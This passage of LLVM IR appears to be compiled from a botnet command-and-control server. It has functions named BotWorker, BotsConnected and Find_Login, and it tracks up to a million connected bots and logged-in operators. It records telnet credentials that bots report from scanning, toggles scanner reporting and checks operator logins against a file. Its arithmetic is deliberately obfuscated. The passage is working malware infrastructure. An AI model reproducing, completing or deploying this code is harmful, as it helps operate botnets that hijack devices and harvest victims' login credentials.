  %94 = call i32 @close(i32 %93)
  br label %318

; <label>:95:                                     ; preds = %60
  %96 = load volatile i32, i32* @listenFD, align 4
  %97 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %98 = load i32, i32* %8, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %97, i64 %99
  %101 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %100, i32 0, i32 1
  %102 = bitcast %union.epoll_data* %101 to i32*
  %103 = load i32, i32* %102, align 1
  %104 = icmp eq i32 %96, %103
  br i1 %104, label %105, label %207

; <label>:105:                                    ; preds = %95
  br label %106

; <label>:106:                                    ; preds = %199, %175, %172, %105
  store i32 16, i32* %10, align 4
  %107 = load volatile i32, i32* @listenFD, align 4
  %108 = call i32 @accept(i32 %107, %struct.sockaddr* %9, i32* %10)
  store i32 %108, i32* %11, align 4
  %109 = load i32, i32* %11, align 4
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %121

; <label>:111:                                    ; preds = %106
  %112 = call i32* @__errno_location() #9
  %113 = load i32, i32* %112, align 4
  %114 = icmp eq i32 %113, 11
  br i1 %114, label %119, label %115

; <label>:115:                                    ; preds = %111
  %116 = call i32* @__errno_location() #9
  %117 = load i32, i32* %116, align 4
  %118 = icmp eq i32 %117, 11
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %115, %111
  br label %206

; <label>:120:                                    ; preds = %115
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  br label %206

; <label>:121:                                    ; preds = %106
  %122 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  %125 = load i32, i32* %124, align 2
  %126 = load i32, i32* %11, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %127
  %129 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %128, i32 0, i32 0
  store i32 %125, i32* %129, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  br label %130

; <label>:130:                                    ; preds = %159, %121
  %131 = load i32, i32* %12, align 4
  %132 = icmp slt i32 %131, 1000000
  br i1 %132, label %133, label %165

; <label>:133:                                    ; preds = %130
  %134 = load i32, i32* %12, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %135
  %137 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %136, i32 0, i32 1
  %138 = load i8, i8* %137, align 4
  %139 = icmp ne i8 %138, 0
  br i1 %139, label %140, label %144

; <label>:140:                                    ; preds = %133
  %141 = load i32, i32* %12, align 4
  %142 = load i32, i32* %11, align 4
  %143 = icmp eq i32 %141, %142
  br i1 %143, label %144, label %145

; <label>:144:                                    ; preds = %140, %133
  br label %159

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* %12, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %147
  %149 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 8
  %151 = load i32, i32* %11, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %152
  %154 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = icmp eq i32 %150, %155
  br i1 %156, label %157, label %158

; <label>:157:                                    ; preds = %145
  store i32 1, i32* %13, align 4
  br label %165

; <label>:158:                                    ; preds = %145
  br label %159

; <label>:159:                                    ; preds = %158, %144
  %160 = load i32, i32* %12, align 4
  %161 = sub i32 %160, 2029301385
  %162 = add i32 %161, 1
  %163 = add i32 %162, 2029301385
  %164 = add nsw i32 %160, 1
  store i32 %163, i32* %12, align 4
  br label %130

; <label>:165:                                    ; preds = %157, %130
  %166 = load i32, i32* %13, align 4
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %178

; <label>:168:                                    ; preds = %165
  %169 = load i32, i32* %11, align 4
  %170 = call i64 @send(i32 %169, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %175

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* %11, align 4
  %174 = call i32 @close(i32 %173)
  br label %106

; <label>:175:                                    ; preds = %168
  %176 = load i32, i32* %11, align 4
  %177 = call i32 @close(i32 %176)
  br label %106

; <label>:178:                                    ; preds = %165
  %179 = load i32, i32* %11, align 4
  %180 = call i32 @make_socket_non_blocking(i32 %179)
  store i32 %180, i32* %6, align 4
  %181 = load i32, i32* %6, align 4
  %182 = icmp eq i32 %181, -1
  br i1 %182, label %183, label %186

; <label>:183:                                    ; preds = %178
  %184 = load i32, i32* %11, align 4
  %185 = call i32 @close(i32 %184)
  br label %206

; <label>:186:                                    ; preds = %178
  %187 = load i32, i32* %11, align 4
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %189 = bitcast %union.epoll_data* %188 to i32*
  store i32 %187, i32* %189, align 1
  %190 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %190, align 1
  %191 = load volatile i32, i32* @epollFD, align 4
  %192 = load i32, i32* %11, align 4
  %193 = call i32 @epoll_ctl(i32 %191, i32 1, i32 %192, %struct.epoll_event* %4) #7
  store i32 %193, i32* %6, align 4
  %194 = load i32, i32* %6, align 4
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %186
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %197 = load i32, i32* %11, align 4
  %198 = call i32 @close(i32 %197)
  br label %206

; <label>:199:                                    ; preds = %186
  %200 = load i32, i32* %11, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %201
  %203 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %202, i32 0, i32 1
  store i8 1, i8* %203, align 4
  %204 = load i32, i32* %11, align 4
  %205 = call i64 @send(i32 %204, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  br label %106

; <label>:206:                                    ; preds = %196, %183, %120, %119
  br label %318

; <label>:207:                                    ; preds = %95
  %208 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %209 = load i32, i32* %8, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %208, i64 %210
  %212 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %211, i32 0, i32 1
  %213 = bitcast %union.epoll_data* %212 to i32*
  %214 = load i32, i32* %213, align 1
  store i32 %214, i32* %14, align 4
  %215 = load i32, i32* %14, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %216
  store %struct.clientdata_t* %217, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %218 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %219 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %218, i32 0, i32 1
  store i8 1, i8* %219, align 4
  br label %220

; <label>:220:                                    ; preds = %314, %207
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %221, i8 0, i64 2048, i32 16, i1 false)
  br label %222

; <label>:222:                                    ; preds = %289, %288, %281, %273, %254, %248, %220
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %223, i8 0, i64 2048, i32 16, i1 false)
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %231

; <label>:225:                                    ; preds = %222
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %227 = load i32, i32* %14, align 4
  %228 = call i32 @fdgets(i8* %226, i32 2048, i32 %227)
  %229 = sext i32 %228 to i64
  store i64 %229, i64* %17, align 8
  %230 = icmp sgt i64 %229, 0
  br label %231

; <label>:231:                                    ; preds = %225, %222
  %232 = phi i1 [ false, %222 ], [ %230, %225 ]
  br i1 %232, label %233, label %292

; <label>:233:                                    ; preds = %231
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %235 = call i8* @strstr(i8* %234, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %236 = icmp eq i8* %235, null
  br i1 %236, label %237, label %238

; <label>:237:                                    ; preds = %233
  store i32 1, i32* %16, align 4
  br label %292

; <label>:238:                                    ; preds = %233
  %239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %239)
  %240 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %241 = call i32 @strcmp(i8* %240, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %249

; <label>:243:                                    ; preds = %238
  %244 = load i32, i32* %14, align 4
  %245 = call i64 @send(i32 %244, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %246 = icmp eq i64 %245, -1
  br i1 %246, label %247, label %248

; <label>:247:                                    ; preds = %243
  store i32 1, i32* %16, align 4
  br label %292

; <label>:248:                                    ; preds = %243
  br label %222

; <label>:249:                                    ; preds = %238
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %253 = icmp eq i8* %251, %252
  br i1 %253, label %254, label %268

; <label>:254:                                    ; preds = %249
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %256 = call i8* @strstr(i8* %255, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %257 = getelementptr inbounds i8, i8* %256, i64 7
  store i8* %257, i8** %19, align 8
  %258 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %259 = load i8*, i8** %19, align 8
  %260 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %258, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %259)
  %261 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %262 = call i32 @fflush(%struct._IO_FILE* %261)
  %263 = load volatile i32, i32* @TELFound, align 4
  %264 = add i32 %263, -668753492
  %265 = add i32 %264, 1
  %266 = sub i32 %265, -668753492
  %267 = add nsw i32 %263, 1
  store volatile i32 %266, i32* @TELFound, align 4
  br label %222

; <label>:268:                                    ; preds = %249
  %269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %270 = call i8* @strstr(i8* %269, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %272 = icmp eq i8* %270, %271
  br i1 %272, label %273, label %276

; <label>:273:                                    ; preds = %268
  %274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %275 = call i8* @strstr(i8* %274, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %275, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %222

; <label>:276:                                    ; preds = %268
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %278 = call i8* @strstr(i8* %277, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %280 = icmp eq i8* %278, %279
  br i1 %280, label %281, label %284

; <label>:281:                                    ; preds = %276
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %283, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %222

; <label>:284:                                    ; preds = %276
  %285 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %287 = icmp eq i32 %286, 0
  br i1 %287, label %288, label %289

; <label>:288:                                    ; preds = %284
  br label %222

; <label>:289:                                    ; preds = %284
  %290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %291 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %290)
  br label %222

; <label>:292:                                    ; preds = %247, %237, %231
  %293 = load i64, i64* %17, align 8
  %294 = icmp eq i64 %293, -1
  br i1 %294, label %295, label %301

; <label>:295:                                    ; preds = %292
  %296 = call i32* @__errno_location() #9
  %297 = load i32, i32* %296, align 4
  %298 = icmp ne i32 %297, 11
  br i1 %298, label %299, label %300

; <label>:299:                                    ; preds = %295
  store i32 1, i32* %16, align 4
  br label %300

; <label>:300:                                    ; preds = %299, %295
  br label %315

; <label>:301:                                    ; preds = %292
  %302 = load i64, i64* %17, align 8
  %303 = icmp eq i64 %302, 0
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %301
  store i32 1, i32* %16, align 4
  br label %315

; <label>:305:                                    ; preds = %301
  br label %306

; <label>:306:                                    ; preds = %305
  %307 = load i32, i32* %16, align 4
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %309, label %314

; <label>:309:                                    ; preds = %306
  %310 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %311 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %310, i32 0, i32 1
  store i8 0, i8* %311, align 4
  %312 = load i32, i32* %14, align 4
  %313 = call i32 @close(i32 %312)
  br label %314

; <label>:314:                                    ; preds = %309, %306
  br label %220

; <label>:315:                                    ; preds = %304, %300
  br label %316

; <label>:316:                                    ; preds = %315
  br label %317

; <label>:317:                                    ; preds = %316
  br label %318

; <label>:318:                                    ; preds = %317, %206, %76
  %319 = load i32, i32* %8, align 4
  %320 = add i32 %319, -371063217
  %321 = add i32 %320, 1
  %322 = sub i32 %321, -371063217
  %323 = add nsw i32 %319, 1
  store i32 %322, i32* %8, align 4
  br label %28

; <label>:324:                                    ; preds = %28
  br label %24
                                                  ; No predecessors!
  %326 = load i8*, i8** %2, align 8
  ret i8* %326
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 2048, -1
  %15 = xor i32 -1372175664, -1
  %16 = and i32 %13, -1372175664
  %17 = and i32 %12, %15
  %18 = and i32 %14, -1372175664
  %19 = and i32 2048, %15
  %20 = or i32 %16, %17
  %21 = or i32 %18, %19
  %22 = xor i32 %20, %21
  %23 = or i32 %13, %14
  %24 = xor i32 %23, -1
  %25 = or i32 -1372175664, %15
  %26 = and i32 %24, %25
  %27 = or i32 %22, %26
  %28 = or i32 %12, 2048
  store i32 %27, i32* %4, align 4
  %29 = load i32, i32* %3, align 4
  %30 = load i32, i32* %4, align 4
  %31 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %30)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:35:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %36

; <label>:36:                                     ; preds = %35, %34, %10
  %37 = load i32, i32* %2, align 4
  ret i32 %37
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %21, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %26

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %21

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = sub i32 0, %15
  %17 = sub i32 0, 1
  %18 = add i32 %16, %17
  %19 = sub i32 0, %18
  %20 = add nsw i32 %15, 1
  store i32 %19, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %14, %13
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %1, align 4
  br label %3

; <label>:26:                                     ; preds = %3
  %27 = load i32, i32* %2, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

; <label>:7:                                      ; preds = %20, %1
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 2048, i32 16, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %10, i32 %11, i32 7) #7
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %7
  ret i8* null

; <label>:20:                                     ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %47

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %29, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %35

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %29

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = sub i32 0, 1
  %26 = sub i32 %24, %25
  %27 = add nsw i32 %24, 1
  store i32 %26, i32* %6, align 4
  %28 = load i32, i32* %5, align 4
  store i32 %28, i32* %7, align 4
  br label %29

; <label>:29:                                     ; preds = %23, %18
  %30 = load i32, i32* %5, align 4
  %31 = add i32 %30, 726045818
  %32 = add i32 %31, 1
  %33 = sub i32 %32, 726045818
  %34 = add nsw i32 %30, 1
  store i32 %33, i32* %5, align 4
  br label %13

; <label>:35:                                     ; preds = %13
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %37 = icmp ne %struct._IO_FILE* %36, null
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %35
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %40 = call i32 @fclose(%struct._IO_FILE* %39)
  br label %41

; <label>:41:                                     ; preds = %38, %35
  %42 = load i32, i32* %6, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  store i32 0, i32* %2, align 4
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  br label %47

; <label>:47:                                     ; preds = %45, %44, %11
  %48 = load i32, i32* %2, align 4
  ret i32 %48
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca %struct._IO_FILE*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca [80 x i8], align 16
  %17 = alloca [5000 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [2048 x i8], align 16
  %29 = alloca [2048 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [2048 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [80 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca %struct._IO_FILE*, align 8
  %58 = alloca i64, align 8
  %59 = alloca %struct.tm*, align 8
  %60 = alloca [50 x i8], align 16
  %61 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %62 = load i8*, i8** %3, align 8
  %63 = ptrtoint i8* %62 to i32
  store i32 %63, i32* %4, align 4
  %64 = load volatile i32, i32* @OperatorsConnected, align 4
  %65 = add i32 %64, 438974118
  %66 = add i32 %65, 1
  %67 = sub i32 %66, 438974118
  %68 = add nsw i32 %64, 1
  store volatile i32 %67, i32* @OperatorsConnected, align 4
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %69, i8 0, i64 2048, i32 16, i1 false)
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %12, align 4
  %71 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %71, %struct._IO_FILE** %11, align 8
  br label %72

; <label>:72:                                     ; preds = %87, %1
  %73 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %74 = call i32 @feof(%struct._IO_FILE* %73) #7
  %75 = icmp ne i32 %74, 0
  %76 = xor i1 %75, true
  %77 = and i1 true, %76
  %78 = xor i1 true, true
  %79 = and i1 %75, %78
  %80 = xor i1 true, true
  %81 = and i1 %80, true
  %82 = and i1 true, %78
  %83 = or i1 %77, %79
  %84 = or i1 %81, %82
  %85 = xor i1 %83, %84
  %86 = xor i1 %75, true
  br i1 %85, label %87, label %96

; <label>:87:                                     ; preds = %72
  %88 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %89 = call i32 @fgetc(%struct._IO_FILE* %88)
  store i32 %89, i32* %13, align 4
  %90 = load i32, i32* %12, align 4
  %91 = sub i32 0, %90
  %92 = sub i32 0, 1
  %93 = add i32 %91, %92
  %94 = sub i32 0, %93
  %95 = add nsw i32 %90, 1
  store i32 %94, i32* %12, align 4
  br label %72

; <label>:96:                                     ; preds = %72
  store i32 0, i32* %14, align 4
  %97 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  call void @rewind(%struct._IO_FILE* %97)
  br label %98

; <label>:98:                                     ; preds = %106, %96
  %99 = load i32, i32* %14, align 4
  %100 = load i32, i32* %12, align 4
  %101 = add i32 %100, -1386783469
  %102 = sub i32 %101, 1
  %103 = sub i32 %102, -1386783469
  %104 = sub nsw i32 %100, 1
  %105 = icmp ne i32 %99, %103
  br i1 %105, label %106, label %124

; <label>:106:                                    ; preds = %98
  %107 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %108 = load i32, i32* %14, align 4
  %109 = sext i32 %108 to i64
